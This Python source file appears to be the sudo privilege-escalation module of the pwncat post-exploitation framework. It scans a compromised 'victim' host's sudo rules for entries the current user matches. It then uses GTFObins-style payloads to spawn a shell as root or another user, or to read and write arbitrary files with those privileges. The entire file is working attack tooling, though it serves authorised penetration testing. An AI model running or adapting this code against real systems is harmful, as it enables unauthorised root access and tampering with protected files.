#!/usr/bin/env python3
from typing import List

from colorama import Fore, Style

import pwncat
from pwncat import util
from pwncat.file import RemoteBinaryPipe
from pwncat.gtfobins import Capability, Stream
from pwncat.privesc import BaseMethod, PrivescError, Technique


class Method(BaseMethod):

    name = "sudo"
    id = "sudo"
    BINARIES = ["sudo"]

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        rules = []
        for fact in pwncat.victim.enumerate("sudo"):

            # Doesn't appear to be a user specification
            if not fact.data.matched:
                continue

            # This specifies a user that is not us
            if (
                fact.data.user != "ALL"
                and fact.data.user != pwncat.victim.current_user.name
                and fact.data.group is None
            ):
                continue

            # Check if we are part of the specified group
            if fact.data.group is not None:
                for group in pwncat.victim.current_user.groups:
                    if fact.data.group == group.name:
                        break
                else:
                    # Non of our secondary groups match, was our primary group specified?
                    if fact.data.group != pwncat.victim.current_user.group.name:
                        continue

            # The rule appears to match, add it to the list
            rules.append(fact.data)

        # We don't need that progress after this is complete
        util.erase_progress()

        for rule in rules:
            for method in pwncat.victim.gtfo.iter_sudo(rule.command, caps=capability):
                user = "root" if rule.runas_user == "ALL" else rule.runas_user
                yield Technique(user, self, (method, rule), method.cap)

    def execute(self, technique: Technique):
        """ Run the specified technique """

        method, rule = technique.ident

        payload, input_data, exit_command = method.build(
            user=technique.user, shell=pwncat.victim.shell, spec=rule.command
        )

        try:
            pwncat.victim.sudo(payload, as_is=True, wait=False)
        except PermissionError as exc:
            raise PrivescError(str(exc))

        pwncat.victim.client.send(input_data.encode("utf-8"))

        return exit_command

    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:

        method, rule = technique.ident

        payload, input_data, exit_command = method.build(
            user=technique.user, lfile=filepath, spec=rule.command
        )

        mode = "r"
        if method.stream is Stream.RAW:
            mode += "b"

        try:
            pipe = pwncat.victim.sudo(
                payload,
                as_is=True,
                stream=True,
                mode=mode,
                exit_cmd=exit_command.encode("utf-8"),
            )
        except PermissionError as exc:
            raise PrivescError(str(exc))

        pwncat.victim.client.send(input_data.encode("utf-8"))

        return method.wrap_stream(pipe)

    def write_file(self, filepath: str, data: bytes, technique: Technique):

        method, rule = technique.ident

        payload, input_data, exit_command = method.build(
            user=technique.user, lfile=filepath, spec=rule.command, length=len(data)
        )

        mode = "w"
        if method.stream is Stream.RAW:
            mode += "b"

        try:
            pipe = pwncat.victim.sudo(
                payload,
                as_is=True,
                stream=True,
                mode=mode,
                exit_cmd=exit_command.encode("utf-8"),
            )
        except PermissionError as exc:
            raise PrivescError(str(exc))

        pwncat.victim.client.send(input_data.encode("utf-8"))

        with method.wrap_stream(pipe) as pipe:
            pipe.write(data)

    def get_name(self, tech: Technique):
        """ Get the name of the given technique for display """
        return (
            (f"[cyan]{tech.ident[0].binary_path}[/cyan] ([red]sudo")
            + (
                ""
                if "NOPASSWD" not in tech.ident[1].options
                else f" [bold]NOPASSWD[/bold]"
            )
            + "[/red])"
        )
